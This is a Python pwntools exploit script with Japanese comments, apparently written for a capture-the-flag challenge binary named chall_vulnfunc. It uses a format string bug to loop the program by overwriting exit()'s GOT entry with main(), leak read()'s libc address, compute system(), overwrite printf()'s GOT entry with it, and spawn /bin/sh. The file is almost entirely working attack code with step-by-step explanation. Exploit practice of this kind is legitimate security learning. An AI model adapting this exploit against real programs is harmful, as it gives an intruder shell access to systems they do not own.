#!/usr/bin/env python3

# $ ptyhon3 exploit_vulnfunc_2.py

'''
概要
・目的：書式文字列攻撃によりシェルを起動する
        →書式文字列攻撃によりprintf()をsystem()に書き換えたいが、system()はchall_vulnfuncで使われていないため、system()のアドレスは分からない
・対策：chall_vulnfuncでread()は使われているため、read()のアドレスは書式文字列攻撃によりリーク可能
        →read()のアドレスから、libcのベースアドレスを求めて、system()のアドレスを求める
・課題：chall_vulnfuncは起動される度に、read()のアドレスが変わるため、chall_vulnfuncを終了させないようにする必要がある
        →最初に、書式文字列攻撃によりexit()をmain()に書き換える

'''

from pwn import *
import re

bin_file = './chall_vulnfunc'
context(os = 'linux', arch = 'amd64')
#context.log_level = 'debug'

context.binary = bin_file
elf = context.binary

binf = ELF(bin_file)
addr_main           = binf.functions['main'].address    # main()のアドレス
addr_got_exit       = binf.got['exit']                  # GOTテーブル:exit()のアドレス
addr_got_printf     = binf.got['printf']                # GOTテーブル:printf()のアドレス
addr_got_read       = binf.got['read']                  # GOTテーブル:read()のアドレス

info('addr_main = 0x{:08x}'.format(addr_main))
info('addr_got_exit = 0x{:08x}'.format(addr_got_exit))
info('addr_got_printf = 0x{:08x}'.format(addr_got_printf))
info('addr_got_read = 0x{:08x}'.format(addr_got_read))

libc = binf.libc
offset_libc_read    = libc.functions['read'].address    # libcのread()のアドレス

info('offset_libc_read = 0x{:08x}'.format(offset_libc_read))

# 文字列を2byteずつ逆順に並べ変える（文字列のエンディアン変換）
def reverse_2bytes(s: str) -> str:
    return ''.join([s[i:i+2] for i in range(0, len(s), 2)][::-1])

# ユーザの入力の位置確認
def check_format_string_pos(conn, **kwargs):
    exploit = 'aaaaaaaa %p %p %p %p %p %p %p %p %p'     # aaaaaaaaが何番目に表示されるか調べる
    conn.sendline(exploit)
    print(conn.recvall().decode())                      # 0x6161616161616161(aaaaaaaa)が7番目に表示される

def attack(conn, **kwargs):

    # exit()のアドレスをmain()のアドレスに書き換え
    # →ループ化され、何度も書式文字列攻撃できる
    fs_idx = 8                                          # 何番目の書式文字列かを指定（7番目の書式文字を使用したいが、8byteを超えるため8番目を使用）
    str_num = addr_main                                 # %cで出力する文字数（main関数のアドレスに書き換えたいので、main関数のアドレスを設定する）
    payload = b''
    payload += f'%{str_num}c%{fs_idx}$lln'.encode()     # long long型で、main関数のアドレスを文字数として出力するための書式文字列
    payload = payload.ljust(0x10, b'\x00')              # long long型でスタックに積むため、16byte単位にアライメント
    payload += p64(addr_got_exit)                       # exit関数のアドレスを書き換えるため、printf('%{str_num}c%{fs_idx}$lln', addr_got_exit)とする
    info('payload = {}'.format(payload))
    conn.sendafter('Input message\n', payload)          # exit()のアドレスをmain()のアドレスに書き換え実施

    # read()のアドレスをリークする
    exploit = b'%7$s'.ljust(8, b'\x00')                         # 7番目の書式文字列 (スタックに積むため8byte単位にアライメント)
    exploit += struct.pack('<Q', addr_got_read)                 # readのGOTテーブルのアドレス (スタックに積むため8byte単位にアライメント)
    conn.sendline(exploit)
    conn.sendlineafter('Input message\n', exploit)
    recv_data = conn.recvline(keepends=False)                   # read()のアドレスをリーク（先頭に、'Input message'がついた状態でリークされる）
    recv_data = re.sub(b'Input message', b'', recv_data)        # 'Input message'を削除
    addr_libc_read = int(reverse_2bytes(recv_data.hex()), 16)   # エンディアン変換
    info('addr_libc_read = 0x{:08x}'.format(addr_libc_read))

    # system()のアドレスを求める
    libc.address = addr_libc_read - offset_libc_read            # libcのベースアドレスを計算する
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.functions['system'].address      # system()のアドレスを求める
    info('addr_libc_system = {}'.format(hex(addr_libc_system)))

    # printf()のGOTをsystem()に書き換え
    exploit  = '%{}c'.format((addr_libc_system >> 16) & 0xff)
    exploit += '%10$hhn' # 1バイト
    exploit += '%{}c'.format((addr_libc_system & 0xffff) - ((addr_libc_system >> 16) & 0xff))
    exploit += '%11$hn'  # 2バイト
    exploit  = exploit.ljust(0x20, 'x').encode()
    exploit += flat(addr_got_printf+2, addr_got_printf) # 10, 11
    conn.sendafter('Input message\n', exploit)
    conn.sendafter('Input message\n', '/bin/sh')

def main():
    # 事前確認
    conn = process(bin_file)
    check_format_string_pos(conn) # 何番目の引数を利用するか調べる

    # 書式文字列攻撃
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
